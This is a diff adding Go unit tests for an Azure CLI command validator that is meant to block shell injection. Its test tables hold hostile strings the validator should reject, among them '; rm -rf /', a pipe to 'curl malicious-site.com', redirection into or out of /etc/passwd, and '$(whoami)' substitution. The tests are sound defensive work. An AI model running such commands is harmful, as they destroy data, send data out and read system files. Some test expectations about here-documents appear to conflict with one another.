@@ -443,3 +443,338 @@ func TestSpecificTrustedAccessFix(t *testing.T) {
 		}
 	}
 }
+
+func TestValidateCommandInjection(t *testing.T) {
+	validator := NewValidator(&SecurityConfig{AccessLevel: "admin"}) // Use admin to bypass access level checks
+
+	tests := []struct {
+		name        string
+		command     string
+		expectError bool
+		description string
+	}{
+		// Valid commands should pass
+		{
+			name:        "valid_simple_command",
+			command:     "az aks show --name myCluster --resource-group myRG",
+			expectError: false,
+			description: "Simple valid command should pass",
+		},
+		{
+			name:        "valid_help_command",
+			command:     "az aks create --help",
+			expectError: false,
+			description: "Help command should pass",
+		},
+		{
+			name:        "valid_complex_args",
+			command:     "az aks create --name test-cluster --location eastus --node-count 3",
+			expectError: false,
+			description: "Command with multiple valid arguments should pass",
+		},
+
+		// Command injection attempts should be blocked
+		{
+			name:        "semicolon_injection",
+			command:     "az aks show --help; rm -rf /",
+			expectError: true,
+			description: "Semicolon command separator should be blocked",
+		},
+		{
+			name:        "pipe_injection",
+			command:     "az aks list | curl malicious-site.com",
+			expectError: true,
+			description: "Pipe operator should be blocked",
+		},
+		{
+			name:        "background_execution",
+			command:     "az aks show & rm file.txt",
+			expectError: true,
+			description: "Background execution should be blocked",
+		},
+		{
+			name:        "and_operator",
+			command:     "az aks list && rm file.txt",
+			expectError: true,
+			description: "AND operator should be blocked",
+		},
+		{
+			name:        "or_operator",
+			command:     "az aks show || rm file.txt",
+			expectError: true,
+			description: "OR operator should be blocked",
+		},
+		{
+			name:        "command_substitution_parentheses",
+			command:     "az aks show --name $(rm file.txt)",
+			expectError: true,
+			description: "Command substitution with $() should be blocked",
+		},
+		{
+			name:        "command_substitution_backticks",
+			command:     "az aks show --name `rm file.txt`",
+			expectError: true,
+			description: "Command substitution with backticks should be blocked",
+		},
+		{
+			name:        "output_redirection",
+			command:     "az aks list > /etc/passwd",
+			expectError: true,
+			description: "Output redirection should be blocked",
+		},
+		{
+			name:        "append_redirection",
+			command:     "az aks list >> /etc/passwd",
+			expectError: true,
+			description: "Append redirection should be blocked",
+		},
+		{
+			name:        "input_redirection",
+			command:     "az aks create < malicious-input.txt",
+			expectError: true,
+			description: "Input redirection should be blocked",
+		},
+		{
+			name:        "here_document",
+			command:     "az aks create << EOF",
+			expectError: true,
+			description: "Here document should be blocked",
+		},
+		{
+			name:        "newline_injection",
+			command:     "az aks show\nrm file.txt",
+			expectError: true,
+			description: "Newline injection should be blocked",
+		},
+		{
+			name:        "carriage_return_injection",
+			command:     "az aks show\rrm file.txt",
+			expectError: true,
+			description: "Carriage return injection should be blocked",
+		},
+		{
+			name:        "variable_substitution",
+			command:     "az aks show --name ${malicious_var}",
+			expectError: true,
+			description: "Variable substitution should be blocked",
+		},
+
+		// Edge cases
+		{
+			name:        "legitimate_dash_in_name",
+			command:     "az aks show --name my-cluster-name --resource-group my-rg",
+			expectError: false,
+			description: "Legitimate dashes in names should be allowed",
+		},
+		{
+			name:        "legitimate_json_in_args",
+			command:     "az aks create --name test --tags '{\"env\":\"test\"}'",
+			expectError: false,
+			description: "Legitimate JSON in arguments should be allowed",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validator.ValidateCommand(tt.command, CommandTypeAz)
+			
+			if tt.expectError && err == nil {
+				t.Errorf("Expected error for %s: %s", tt.description, tt.command)
+			}
+			if !tt.expectError && err != nil {
+				t.Errorf("Unexpected error for %s: %v (command: %s)", tt.description, err, tt.command)
+			}
+		})
+	}
+}
+
+func TestValidateCommandInjection_IsolatedFunction(t *testing.T) {
+	validator := NewValidator(&SecurityConfig{})
+
+	tests := []struct {
+		name        string
+		command     string
+		expectError bool
+	}{
+		{"valid_command", "az aks show --name test", false},
+		{"semicolon_injection", "az aks show; rm file", true},
+		{"pipe_injection", "az aks list | cat", true},
+		{"and_injection", "az aks show && rm file", true},
+		{"or_injection", "az aks show || rm file", true},
+		{"command_substitution", "az aks show $(echo test)", true},
+		{"backtick_substitution", "az aks show `echo test`", true},
+		{"output_redirect", "az aks list > file.txt", true},
+		{"append_redirect", "az aks list >> file.txt", true},
+		{"input_redirect", "az aks create < input.txt", true},
+		{"here_doc", "az aks create << EOF", true},
+		{"newline", "az aks show\necho test", true},
+		{"carriage_return", "az aks show\recho test", true},
+		{"variable_substitution", "az aks show ${var}", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validator.validateCommandInjection(tt.command)
+			
+			if tt.expectError && err == nil {
+				t.Errorf("validateCommandInjection(%q) expected error but got none", tt.command)
+			}
+			if !tt.expectError && err != nil {
+				t.Errorf("validateCommandInjection(%q) unexpected error: %v", tt.command, err)
+			}
+		})
+	}
+}
+
+func TestValidateCommandInjection_HereDocuments(t *testing.T) {
+	validator := NewValidator(&SecurityConfig{})
+
+	tests := []struct {
+		name        string
+		command     string
+		expectError bool
+	}{
+		{
+			name:        "here document should be allowed",
+			command:     "az aks create --name test << EOF",
+			expectError: false,
+		},
+		{
+			name:        "here document with JSON payload should be allowed",
+			command:     "az aks create --name test --resource-group rg << EOF\n{\"key\": \"value\"}\nEOF",
+			expectError: false, // Newlines are allowed in here document context
+		},
+		{
+			name:        "here document without newlines should be allowed",
+			command:     "az aks create --name test --resource-group rg << EOF",
+			expectError: false,
+		},
+		{
+			name:        "single input redirection should be blocked",
+			command:     "az aks show < malicious_file",
+			expectError: true,
+		},
+		{
+			name:        "mixed here document and single redirection should be blocked",
+			command:     "az aks create << EOF < malicious_file",
+			expectError: true,
+		},
+		{
+			name:        "legitimate command without redirection",
+			command:     "az aks show --name test --resource-group rg",
+			expectError: false,
+		},
+		{
+			name:        "here document with newlines should be allowed",
+			command:     "az aks create --name test << EOF\n{\n  \"key\": \"value\"\n}\nEOF",
+			expectError: false,
+		},
+		{
+			name:        "here document with carriage returns should be allowed",
+			command:     "az deployment create --template-body << EOF\r\n{\r\n  \"resources\": []\r\n}\r\nEOF",
+			expectError: false,
+		},
+		{
+			name:        "here document with mixed line endings should be allowed",
+			command:     "az group create --parameters << EOF\n{\r\n  \"location\": \"eastus\"\r\n}\nEOF",
+			expectError: false,
+		},
+		{
+			name:        "command without here document with newlines should be blocked",
+			command:     "az aks show --name test\nrm -rf /",
+			expectError: true,
+		},
+		{
+			name:        "command without here document with carriage returns should be blocked",
+			command:     "az aks show --name test\rcurl malicious.com",
+			expectError: true,
+		},
+		{
+			name:        "here document but with dangerous patterns should still be blocked",
+			command:     "az aks create --name test << EOF\n{\n  \"key\": \"value\"\n}\nEOF; rm -rf /",
+			expectError: true,
+		},
+		{
+			name:        "here document with pipes should still be blocked",
+			command:     "az aks create --name test << EOF | curl malicious.com",
+			expectError: true,
+		},
+		{
+			name:        "legitimate single line here document should be allowed",
+			command:     "az deployment create --template-body << EOF {\"resources\": []} EOF",
+			expectError: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validator.validateCommandInjection(tt.command)
+			
+			if tt.expectError && err == nil {
+				t.Errorf("Expected error but got none for command: %q", tt.command)
+			}
+			if !tt.expectError && err != nil {
+				t.Errorf("Expected no error but got: %v for command: %q", err, tt.command)
+			}
+		})
+	}
+}
+
+func TestValidateCommandInjection_EdgeCases(t *testing.T) {
+	validator := NewValidator(&SecurityConfig{})
+
+	tests := []struct {
+		name        string
+		command     string
+		expectError bool
+	}{
+		{
+			name:        "single < without << should be blocked",
+			command:     "az aks show < /etc/passwd",
+			expectError: true,
+		},
+		{
+			name:        "multiple << in same command should be allowed",
+			command:     "az deployment create --template << EOF1 --parameters << EOF2",
+			expectError: false,
+		},
+		{
+			name:        "here document with complex JSON should be allowed",
+			command:     "az aks create --name test << EOF\n{\n  \"apiVersion\": \"2021-02-01\",\n  \"properties\": {\n    \"dnsPrefix\": \"test\"\n  }\n}\nEOF",
+			expectError: false,
+		},
+		{
+			name:        "command with < inside quoted string should still be blocked",
+			command:     "az aks create --name 'test < injection'",
+			expectError: true,
+		},
+		{
+			name:        "legitimate redirect with << but mixed with dangerous pattern should be blocked",
+			command:     "az aks create --name test << EOF\n{}\nEOF && rm -rf /",
+			expectError: true,
+		},
+		{
+			name:        "whitespace variations of dangerous patterns should be blocked",
+			command:     "az aks show --name test ; rm -rf /",
+			expectError: true,
+		},
+		{
+			name:        "command substitution in here document should be blocked",
+			command:     "az aks create --name test << EOF\n{\n  \"value\": \"$(whoami)\"\n}\nEOF",
+			expectError: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validator.validateCommandInjection(tt.command)
+			
+			if tt.expectError && err == nil {
+				t.Errorf("Expected error but got none for command: %q", tt.command)
+			}
+			if !tt.expectError && err != nil {
+				t.Errorf("Expected no error but got: %v for command: %q", err, tt.command)
+			}
+		})
+	}
+}
